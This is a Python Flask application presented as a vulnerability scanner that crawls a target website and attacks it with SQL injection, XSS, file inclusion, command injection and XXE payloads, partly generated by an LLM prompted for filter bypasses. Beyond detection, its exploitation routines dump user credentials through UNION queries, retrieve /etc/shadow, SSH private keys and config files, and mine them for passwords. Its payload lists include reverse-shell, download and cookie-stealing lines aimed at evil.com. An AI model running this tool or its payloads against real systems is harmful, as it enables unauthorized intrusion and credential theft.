from flask import Flask, render_template, request, jsonify, session
import requests
from bs4 import BeautifulSoup
import urllib.parse
import json
import time
import random
import re
from urllib.parse import urljoin, urlparse
import threading
from datetime import datetime
import sqlite3
import os
from concurrent.futures import ThreadPoolExecutor
import google.generativeai as genai

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this'

# Initialize database
def init_db():
    conn = sqlite3.connect('scanner_results.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  target_url TEXT,
                  vulnerability_type TEXT,
                  payload TEXT,
                  response_code INTEGER,
                  response_content TEXT,
                  is_vulnerable BOOLEAN,
                  confidence_score REAL,
                  data_extracted BOOLEAN DEFAULT 0,
                  extracted_data TEXT,
                  severity TEXT DEFAULT 'LOW')''')
    conn.commit()
    conn.close()

init_db()

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.discovered_urls = set()
        self.vulnerabilities_found = []
        self.llm_model = None
        self.api_key = None
        self.ollama_model = None
        self.use_ollama = False
        
    def configure_llm(self, api_key=None, ollama_model=None, use_ollama=False):
        self.api_key = api_key
        self.ollama_model = ollama_model
        self.use_ollama = use_ollama
        
        if not use_ollama and api_key:
            genai.configure(api_key=api_key)
            self.llm_model = genai.GenerativeModel('gemini-2.0-flash-exp')
    
    def discover_urls(self, base_url, max_depth=3):
        """Discover internal URLs from the target website with deep exploration"""
        discovered = set()
        to_crawl = [(base_url, 0)]
        crawled = set()
        
        # Common endpoint patterns to try
        common_endpoints = [
            '/admin', '/admin.php', '/administrator', '/wp-admin', '/login', '/login.php',
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql', '/swagger',
            '/config', '/config.php', '/database.php', '/db.php', '/connect.php',
            '/test', '/test.php', '/debug', '/debug.php', '/info.php', '/phpinfo.php',
            '/upload', '/uploads', '/files', '/images', '/assets', '/static',
            '/backup', '/backups', '/logs', '/log', '/tmp', '/temp',
            '/user', '/users', '/profile', '/account', '/settings',
            '/search', '/contact', '/about', '/help', '/faq',
            '/.env', '/.git', '/robots.txt', '/sitemap.xml', '/composer.json'
        ]
        
        # Add common endpoints to discovery
        base_parsed = urlparse(base_url)
        for endpoint in common_endpoints:
            test_url = f"{base_parsed.scheme}://{base_parsed.netloc}{endpoint}"
            to_crawl.append((test_url, 0))
        
        while to_crawl:
            url, depth = to_crawl.pop(0)
            if url in crawled or depth > max_depth:
                continue
                
            crawled.add(url)
            try:
                response = self.session.get(url, timeout=10)
                
                # Even if page returns 404, it might still be worth testing for vulnerabilities
                if response.status_code in [200, 301, 302, 403, 500]:
                    discovered.add(url)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all(['a'], href=True):
                        href = link.get('href')
                        if href:
                            full_url = urljoin(url, href)
                            parsed = urlparse(full_url)
                            
                            # Only include internal URLs
                            if parsed.netloc == base_parsed.netloc:
                                discovered.add(full_url)
                                if depth < max_depth:
                                    to_crawl.append((full_url, depth + 1))
                    
                    # Find forms and their actions
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        
                        if action:
                            form_url = urljoin(url, action)
                            discovered.add(form_url)
                            
                            # Extract form parameters for later testing
                            form_params = []
                            for input_field in form.find_all(['input', 'textarea', 'select']):
                                param_name = input_field.get('name')
                                if param_name:
                                    form_params.append(param_name)
                            
                            # Store form info for vulnerability testing
                            if not hasattr(self, 'discovered_forms'):
                                self.discovered_forms = {}
                            self.discovered_forms[form_url] = {
                                'method': method,
                                'parameters': form_params
                            }
                    
                    # Look for JavaScript files that might contain API endpoints
                    for script in soup.find_all('script', src=True):
                        script_url = urljoin(url, script['src'])
                        if base_parsed.netloc in script_url:
                            discovered.add(script_url)
                            
                            # Try to extract API endpoints from JavaScript
                            try:
                                js_response = self.session.get(script_url, timeout=5)
                                js_content = js_response.text
                                
                                # Look for API endpoint patterns
                                import re
                                api_patterns = [
                                    r'["\']/(api/[^"\']+)["\']',
                                    r'["\']/(rest/[^"\']+)["\']',
                                    r'["\']/(v\d+/[^"\']+)["\']',
                                    r'fetch\(["\']([^"\']+)["\']',
                                    r'ajax\(["\']([^"\']+)["\']'
                                ]
                                
                                for pattern in api_patterns:
                                    matches = re.findall(pattern, js_content)
                                    for match in matches:
                                        api_url = urljoin(base_url, match)
                                        if base_parsed.netloc in api_url:
                                            discovered.add(api_url)
                            except:
                                pass
                    
                    # Look for CSS files that might reference additional resources
                    for css_link in soup.find_all('link', rel='stylesheet'):
                        css_url = css_link.get('href')
                        if css_url:
                            full_css_url = urljoin(url, css_url)
                            if base_parsed.netloc in full_css_url:
                                discovered.add(full_css_url)
                
            except Exception as e:
                print(f"Error crawling {url}: {e}")
        
        # Filter out duplicates and clean URLs
        clean_discovered = set()
        for url in discovered:
            # Remove fragments and normalize
            parsed = urlparse(url)
            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                clean_url += f"?{parsed.query}"
            clean_discovered.add(clean_url)
        
        self.discovered_urls = clean_discovered
        print(f"[INFO] Discovered {len(clean_discovered)} URLs for testing")
        return list(clean_discovered)
    
    def generate_llm_payloads(self, vulnerability_type, target_url, context=""):
        """Generate sophisticated payloads using LLM"""
        if self.use_ollama and self.ollama_model:
            return self._generate_ollama_payloads(vulnerability_type, target_url, context)
        elif self.llm_model and self.api_key:
            return self._generate_gemini_payloads(vulnerability_type, target_url, context)
        else:
            return self._get_default_payloads(vulnerability_type)
    
    def _generate_gemini_payloads(self, vulnerability_type, target_url, context):
        """Generate payloads using Gemini"""
        try:
            prompt = f"""
            Generate 10 sophisticated {vulnerability_type} payloads for testing the URL: {target_url}
            Context: {context}
            
            Requirements:
            1. Include both basic and advanced payloads
            2. Consider different encoding methods (URL, HTML, Unicode, etc.)
            3. Include bypass techniques for common filters
            4. Make payloads specific to the vulnerability type
            5. Include payloads that test for different scenarios
            
            Return only the payloads, one per line, without explanations.
            """
            
            response = self.llm_model.generate_content(prompt)
            payloads = [p.strip() for p in response.text.split('\n') if p.strip()]
            return payloads[:10]  # Limit to 10 payloads
            
        except Exception as e:
            print(f"Error generating Gemini payloads: {e}")
            return self._get_default_payloads(vulnerability_type)
    
    def _generate_ollama_payloads(self, vulnerability_type, target_url, context):
        """Generate payloads using Ollama"""
        try:
            prompt = f"""Generate 10 {vulnerability_type} payloads for {target_url}. Context: {context}"""
            
            response = requests.post('http://localhost:11434/api/generate', 
                                   json={
                                       'model': self.ollama_model,
                                       'prompt': prompt,
                                       'stream': False
                                   })
            
            if response.status_code == 200:
                result = response.json()
                payloads = [p.strip() for p in result['response'].split('\n') if p.strip()]
                return payloads[:10]
            else:
                return self._get_default_payloads(vulnerability_type)
                
        except Exception as e:
            print(f"Error generating Ollama payloads: {e}")
            return self._get_default_payloads(vulnerability_type)
    
    def _get_default_payloads(self, vulnerability_type):
        """Default payloads for different vulnerability types"""
        payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "file:///etc/passwd"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "| id",
                "; wget http://evil.com/shell.php",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
                "| curl http://evil.com/$(whoami)"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd"><data>&send;</data>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
            ]
        }
        return payloads.get(vulnerability_type, [])
    
    def test_sql_injection(self, url, params=None):
        """Test for SQL injection vulnerabilities with deep exploitation"""
        payloads = self.generate_llm_payloads('sql_injection', url)
        results = []
        
        # First, test basic payloads
        for payload in payloads:
            try:
                # Test different parameter positions
                param_names = ['id', 'user', 'search', 'q', 'name', 'email', 'test', 'page']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for SQL error messages
                    sql_errors = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
                        'supplied argument is not a valid MySQL', 'mysql_num_rows',
                        'Error Occurred While Processing Request', 'Server Error',
                        'Microsoft JET Database', 'Error converting data type',
                        'Invalid column name', 'ORA-00921', 'quoted string not properly terminated',
                        'syntax error', 'mysql_error', 'warning: mysql_', 'function.mysql',
                        'MySQL result index', 'Warning: mysql_fetch_array',
                        'valid MySQL result', 'MySqlClient.', 'com.mysql.jdbc',
                        'Zend_Db_Statement_Mysqli_Exception', 'Pdo\\Exception',
                        'SQLite/JDBCDriver', 'SQLite.Exception', 'System.Data.SQLite.SQLiteException',
                        'Warning: sqlite_', 'function.sqlite', 'SQLiteDatabase'
                    ]
                    
                    is_vulnerable = any(error.lower() in response.text.lower() for error in sql_errors)
                    
                    # If vulnerable, try to extract data
                    extracted_data = None
                    data_extracted = False
                    
                    if is_vulnerable:
                        print(f"[VULN FOUND] SQL Injection detected at {test_url}")
                        extracted_data, data_extracted = self._exploit_sql_injection(test_url, param)
                    
                    confidence = 0.9 if data_extracted else (0.8 if is_vulnerable else 0.1)
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'SQL Injection',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat(),
                        'data_extracted': data_extracted,
                        'extracted_data': extracted_data,
                        'severity': 'CRITICAL' if data_extracted else ('HIGH' if is_vulnerable else 'LOW')
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if data_extracted:
                        break  # Found critical vulnerability, stop testing this URL
                    
                    time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Error testing SQL injection on {url}: {e}")
                
        return results
    
    def _exploit_sql_injection(self, vulnerable_url, param):
        """Attempt to extract data from SQL injection vulnerability"""
        try:
            print(f"[EXPLOIT] Attempting data extraction from {vulnerable_url}")
            
            # Parse URL to get base and existing params
            from urllib.parse import urlparse, parse_qs, urlencode
            parsed = urlparse(vulnerable_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Database detection payloads
            db_detection_payloads = [
                f"{param}=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                f"{param}=1' AND (SELECT COUNT(*) FROM mysql.user)>0--",
                f"{param}=1' AND (SELECT COUNT(*) FROM pg_database)>0--",
                f"{param}=1' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
            ]
            
            database_type = None
            for db_payload in db_detection_payloads:
                test_url = f"{base_url}?{db_payload}"
                response = self.session.get(test_url, timeout=10)
                
                if 'information_schema' in db_payload and len(response.text) > 100:
                    database_type = 'MySQL'
                    break
                elif 'pg_database' in db_payload and len(response.text) > 100:
                    database_type = 'PostgreSQL'
                    break
                elif 'sqlite_master' in db_payload and len(response.text) > 100:
                    database_type = 'SQLite'
                    break
            
            extracted_data = {'database_type': database_type}
            
            if database_type == 'MySQL':
                # Try to extract database names
                db_names_payload = f"{param}=1' UNION SELECT GROUP_CONCAT(schema_name),2,3 FROM information_schema.schemata--"
                test_url = f"{base_url}?{db_names_payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Look for database names in response
                if response.status_code == 200 and len(response.text) > 100:
                    extracted_data['databases'] = self._extract_data_from_response(response.text)
                
                # Try to extract table names
                tables_payload = f"{param}=1' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--"
                test_url = f"{base_url}?{tables_payload}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 100:
                    extracted_data['tables'] = self._extract_data_from_response(response.text)
                
                # Try to extract user data (common table names)
                user_tables = ['users', 'user', 'accounts', 'admin', 'members']
                for table in user_tables:
                    user_payload = f"{param}=1' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password)),2,3 FROM {table}--"
                    test_url = f"{base_url}?{user_payload}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200 and ':' in response.text:
                        extracted_data['user_data'] = self._extract_data_from_response(response.text)
                        break
            
            # Check if we extracted any meaningful data
            data_extracted = any(key != 'database_type' and extracted_data.get(key) 
                               for key in extracted_data.keys())
            
            if data_extracted:
                print(f"[CRITICAL] Data extraction successful: {extracted_data}")
            
            return extracted_data, data_extracted
            
        except Exception as e:
            print(f"[ERROR] SQL exploitation failed: {e}")
            return None, False
    
    def _extract_data_from_response(self, response_text):
        """Extract meaningful data from SQL injection response"""
        import re
        
        # Look for patterns that might be extracted data
        patterns = [
            r'([a-zA-Z_][a-zA-Z0-9_]*(?:,[a-zA-Z_][a-zA-Z0-9_]*)+)',  # Comma-separated values
            r'([a-zA-Z0-9_]+:[a-zA-Z0-9$./]+)',  # Username:password patterns
            r'([a-zA-Z_][a-zA-Z0-9_]*\s*[:|=]\s*[a-zA-Z0-9@._-]+)',  # Key-value pairs
        ]
        
        extracted = []
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            if matches:
                extracted.extend(matches[:5])  # Limit to first 5 matches
        
        return extracted[:10] if extracted else None  # Return first 10 items
    
    def test_xss(self, url, params=None):
        """Test for XSS vulnerabilities"""
        payloads = self.generate_llm_payloads('xss', url)
        results = []
        
        for payload in payloads:
            try:
                # Test GET parameters
                if '?' in url:
                    test_url = url + '&xss_test=' + urllib.parse.quote(payload)
                else:
                    test_url = url + '?xss_test=' + urllib.parse.quote(payload)
                
                response = self.session.get(test_url, timeout=10)
                
                # Check if payload is reflected in response
                is_vulnerable = payload in response.text or urllib.parse.unquote(payload) in response.text
                confidence = 0.9 if is_vulnerable else 0.1
                
                result = {
                    'url': url,
                    'vulnerability_type': 'XSS',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                self._save_result(result)
                
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Error testing XSS on {url}: {e}")
                
        return results
    
    def test_lfi(self, url, params=None):
        """Test for Local File Inclusion vulnerabilities with deep file system exploration"""
        payloads = self.generate_llm_payloads('lfi', url)
        results = []
        
        for payload in payloads:
            try:
                # Test different parameter names
                param_names = ['file', 'page', 'include', 'path', 'doc', 'url', 'template', 'view', 'load', 'read']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for file inclusion indicators
                    lfi_indicators = [
                        'root:x:', '/bin/bash', 'daemon:x:', 'www-data:x:',
                        '[boot loader]', '[operating systems]', 'Windows Registry Editor',
                        '# /etc/passwd', 'nobody:x:', 'mail:x:', 'ftp:x:',
                        'Windows IP Configuration', 'Volume Serial Number'
                    ]
                    
                    is_vulnerable = any(indicator in response.text for indicator in lfi_indicators)
                    
                    # If vulnerable, try to extract more files
                    extracted_files = None
                    data_extracted = False
                    
                    if is_vulnerable:
                        print(f"[VULN FOUND] LFI detected at {test_url}")
                        extracted_files, data_extracted = self._exploit_lfi(url, param)
                    
                    confidence = 0.95 if data_extracted else (0.9 if is_vulnerable else 0.1)
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'LFI',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat(),
                        'data_extracted': data_extracted,
                        'extracted_data': extracted_files,
                        'severity': 'CRITICAL' if data_extracted else ('HIGH' if is_vulnerable else 'LOW')
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if data_extracted:
                        break  # Found critical vulnerability
                    
                    time.sleep(random.uniform(0.3, 0.8))
                
            except Exception as e:
                print(f"Error testing LFI on {url}: {e}")
                
        return results
    
    def _exploit_lfi(self, base_url, param):
        """Attempt to extract sensitive files through LFI"""
        try:
            print(f"[EXPLOIT] Attempting file extraction from LFI")
            
            # List of sensitive files to try
            sensitive_files = [
                # Linux/Unix files
                '../../../etc/passwd',
                '../../../etc/shadow',
                '../../../etc/hosts',
                '../../../etc/apache2/apache2.conf',
                '../../../etc/nginx/nginx.conf',
                '../../../var/log/apache2/access.log',
                '../../../var/log/nginx/access.log',
                '../../../home/user/.ssh/id_rsa',
                '../../../root/.bash_history',
                '../../../etc/mysql/my.cnf',
                
                # Windows files
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '..\\..\\..\\windows\\win.ini',
                '..\\..\\..\\windows\\system.ini',
                '..\\..\\..\\inetpub\\wwwroot\\web.config',
                
                # Application files
                '../../../var/www/html/config.php',
                '../../../var/www/html/.env',
                '../../../var/www/html/wp-config.php',
                '../../../var/www/html/database.php',
                '../../../usr/local/apache2/conf/httpd.conf',
                
                # PHP wrappers for more advanced exploitation
                'php://filter/read=convert.base64-encode/resource=../../../etc/passwd',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'php://filter/read=convert.base64-encode/resource=config.php'
            ]
            
            extracted_files = {}
            
            for file_path in sensitive_files:
                try:
                    if '?' in base_url:
                        test_url = f"{base_url}&{param}={urllib.parse.quote(file_path)}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(file_path)}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if file content was retrieved
                    file_indicators = {
                        'passwd': ['root:x:', 'daemon:x:', 'nobody:x:'],
                        'shadow': ['root:$', '$1$', '$6$'],
                        'hosts': ['127.0.0.1', 'localhost'],
                        'config': ['<?php', 'database', 'password', 'DB_PASSWORD'],
                        'log': ['GET /', 'POST /', 'Mozilla/', 'HTTP/1.'],
                        'ssh_key': ['-----BEGIN', 'PRIVATE KEY', 'ssh-rsa'],
                        'history': ['cd ', 'ls ', 'cat ', 'mysql'],
                        'apache': ['ServerRoot', 'DocumentRoot', 'LoadModule'],
                        'nginx': ['server {', 'listen ', 'root '],
                        'win_ini': ['[fonts]', '[extensions]', 'Windows'],
                        'web_config': ['<configuration>', '<appSettings>', '<connectionStrings>']
                    }
                    
                    for file_type, indicators in file_indicators.items():
                        if any(indicator in response.text for indicator in indicators):
                            content = response.text[:500]  # First 500 chars
                            
                            # For base64 encoded content, try to decode
                            if 'php://filter' in file_path and 'base64' in file_path:
                                import base64
                                try:
                                    # Extract base64 content
                                    b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', content)
                                    if b64_match:
                                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                                        content = decoded[:500]
                                except:
                                    pass
                            
                            extracted_files[file_path] = {
                                'type': file_type,
                                'content': content,
                                'size': len(response.text)
                            }
                            print(f"[SUCCESS] Extracted {file_path} ({len(response.text)} bytes)")
                            break
                    
                    time.sleep(0.5)  # Small delay between requests
                    
                except Exception as e:
                    continue  # Try next file
            
            data_extracted = len(extracted_files) > 0
            
            if data_extracted:
                print(f"[CRITICAL] Successfully extracted {len(extracted_files)} files")
                
                # Try to find credentials in extracted files
                self._extract_credentials_from_files(extracted_files)
            
            return extracted_files, data_extracted
            
        except Exception as e:
            print(f"[ERROR] LFI exploitation failed: {e}")
            return None, False
    
    def _extract_credentials_from_files(self, extracted_files):
        """Extract credentials from LFI extracted files"""
        credentials_found = []
        
        for file_path, file_data in extracted_files.items():
            content = file_data['content']
            
            # Look for common credential patterns
            credential_patterns = [
                r'password["\s]*[:=]["\s]*([^"\s\n]+)',
                r'DB_PASSWORD["\s]*[:=]["\s]*([^"\s\n]+)',
                r'mysql_password["\s]*[:=]["\s]*([^"\s\n]+)',
                r'admin["\s]*[:=]["\s]*([^"\s\n]+)',
                r'root:([^:]+):',  # Shadow file format
                r'([a-zA-Z0-9_]+):([a-zA-Z0-9$./]+):',  # General user:pass format
            ]
            
            for pattern in credential_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    for match in matches[:3]:  # Limit to 3 matches per pattern
                        if isinstance(match, tuple):
                            credentials_found.append(f"{match[0]}:{match[1]}")
                        else:
                            credentials_found.append(match)
        
        if credentials_found:
            print(f"[CRITICAL] Found potential credentials: {credentials_found}")
            # Store credentials in extracted_files for reporting
            extracted_files['_credentials'] = credentials_found
    
    def test_command_injection(self, url, params=None):
        """Test for Command Injection vulnerabilities"""
        payloads = self.generate_llm_payloads('command_injection', url)
        results = []
        
        for payload in payloads:
            try:
                # Test different parameter names
                param_names = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'groups=', 'root:', 'bin/sh', 'bin/bash',
                        'Windows IP Configuration', 'Volume in drive', 'Directory of',
                        'total ', 'drwx', '-rw-', 'Permission denied', 'command not found'
                    ]
                    
                    is_vulnerable = any(indicator in response.text for indicator in cmd_indicators)
                    
                    # Check response time for blind command injection
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        # If response took longer than expected, might be vulnerable
                        if response.elapsed.total_seconds() > 3:
                            is_vulnerable = True
                    
                    confidence = 0.8 if is_vulnerable else 0.1
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'Command Injection',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if is_vulnerable:
                        break
                    
                    time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error testing Command Injection on {url}: {e}")
                
        return results
    
    def test_xxe(self, url, params=None):
        """Test for XXE (XML External Entity) vulnerabilities"""
        payloads = self.generate_llm_payloads('xxe', url)
        results = []
        
        for payload in payloads:
            try:
                # Test POST request with XML payload
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml'
                }
                
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for XXE indicators
                xxe_indicators = [
                    'root:x:', 'daemon:x:', '/etc/passwd', 'Windows Registry Editor',
                    '<?xml', 'ENTITY', 'DOCTYPE', 'file:///', 'http://'
                ]
                
                is_vulnerable = any(indicator in response.text for indicator in xxe_indicators)
                
                # Also check for error messages that might indicate XXE processing
                error_indicators = [
                    'XML parsing error', 'External entity', 'DTD processing',
                    'libxml', 'XMLSyntaxError', 'SAXParseException'
                ]
                
                has_xml_processing = any(error in response.text for error in error_indicators)
                if has_xml_processing and not is_vulnerable:
                    confidence = 0.3  # Might be vulnerable but not confirmed
                else:
                    confidence = 0.9 if is_vulnerable else 0.1
                
                result = {
                    'url': url,
                    'vulnerability_type': 'XXE',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                self._save_result(result)
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error testing XXE on {url}: {e}")
                
        return results
    
    def _save_result(self, result):
        """Save scan result to database"""
        conn = sqlite3.connect('scanner_results.db')
        c = conn.cursor()
        
        # Convert extracted_data to JSON string if it exists
        extracted_data_json = None
        if result.get('extracted_data'):
            import json
            try:
                extracted_data_json = json.dumps(result['extracted_data'])
            except:
                extracted_data_json = str(result['extracted_data'])
        
        c.execute('''INSERT INTO scan_results 
                     (timestamp, target_url, vulnerability_type, payload, 
                      response_code, response_content, is_vulnerable, confidence_score,
                      data_extracted, extracted_data, severity)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (result['timestamp'], result['url'], result['vulnerability_type'],
                   result['payload'], result['response_code'], result['response_content'],
                   result['is_vulnerable'], result['confidence_score'],
                   result.get('data_extracted', False), extracted_data_json,
                   result.get('severity', 'LOW')))
        conn.commit()
        conn.close()
    
    def run_comprehensive_scan(self, target_url, scan_types=None):
        """Run comprehensive vulnerability scan"""
        if scan_types is None:
            scan_types = ['sql_injection', 'xss', 'lfi', 'command_injection', 'xxe']
        
        # Discover URLs first
        print("Discovering internal URLs...")
        urls = self.discover_urls(target_url)
        urls.append(target_url)  # Include the main URL
        
        all_results = []
        
        # Test each URL for each vulnerability type
        for url in urls:
            for scan_type in scan_types:
                print(f"Testing {scan_type} on {url}")
                
                if scan_type == 'sql_injection':
                    results = self.test_sql_injection(url)
                elif scan_type == 'xss':
                    results = self.test_xss(url)
                elif scan_type == 'lfi':
                    results = self.test_lfi(url)
                elif scan_type == 'command_injection':
                    results = self.test_command_injection(url)
                elif scan_type == 'xxe':
                    results = self.test_xxe(url)
                
                all_results.extend(results)
        
        return all_results

# Global scanner instance
scanner = VulnerabilityScanner()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/configure', methods=['POST'])
def configure():
    data = request.json
    target_url = data.get('target_url')
    api_key = data.get('api_key')
    ollama_model = data.get('ollama_model')
    use_ollama = data.get('use_ollama', False)
    
    session['target_url'] = target_url
    scanner.configure_llm(api_key, ollama_model, use_ollama)
    
    return jsonify({'status': 'configured'})

@app.route('/discover_urls', methods=['POST'])
def discover_urls():
    target_url = session.get('target_url')
    if not target_url:
        return jsonify({'error': 'No target URL configured'})
    
    urls = scanner.discover_urls(target_url)
    return jsonify({'urls': urls})

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    target_url = session.get('target_url')
    scan_types = data.get('scan_types', ['sql_injection', 'xss', 'lfi'])
    
    if not target_url:
        return jsonify({'error': 'No target URL configured'})
    
    # Run scan in background thread
    def run_scan():
        results = scanner.run_comprehensive_scan(target_url, scan_types)
        session['last_scan_results'] = results
    
    thread = threading.Thread(target=run_scan)
    thread.start()
    
    return jsonify({'status': 'scan_started'})

@app.route('/results')
def get_results():
    conn = sqlite3.connect('scanner_results.db')
    c = conn.cursor()
    c.execute('''SELECT * FROM scan_results ORDER BY timestamp DESC LIMIT 100''')
    results = c.fetchall()
    conn.close()
    
    formatted_results = []
    for result in results:
        # Handle both old and new database schema
        try:
            data_extracted = result[9] if len(result) > 9 else False
            extracted_data = result[10] if len(result) > 10 else None
            severity = result[11] if len(result) > 11 else 'LOW'
        except IndexError:
            data_extracted = False
            extracted_data = None
            severity = 'LOW'
        
        # Parse extracted_data if it's JSON
        if extracted_data:
            import json
            try:
                extracted_data = json.loads(extracted_data)
            except:
                pass  # Keep as string if not valid JSON
        
        formatted_results.append({
            'id': result[0],
            'timestamp': result[1],
            'target_url': result[2],
            'vulnerability_type': result[3],
            'payload': result[4],
            'response_code': result[5],
            'response_content': result[6][:200] + '...' if len(result[6]) > 200 else result[6],
            'is_vulnerable': result[7],
            'confidence_score': result[8],
            'data_extracted': data_extracted,
            'extracted_data': extracted_data,
            'severity': severity
        })
    
    return jsonify({'results': formatted_results})

@app.route('/status')
def get_status():
    return jsonify({
        'discovered_urls_count': len(scanner.discovered_urls),
        'vulnerabilities_found': len([r for r in scanner.vulnerabilities_found if r.get('is_vulnerable')]),
        'llm_configured': scanner.llm_model is not None or scanner.use_ollama
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)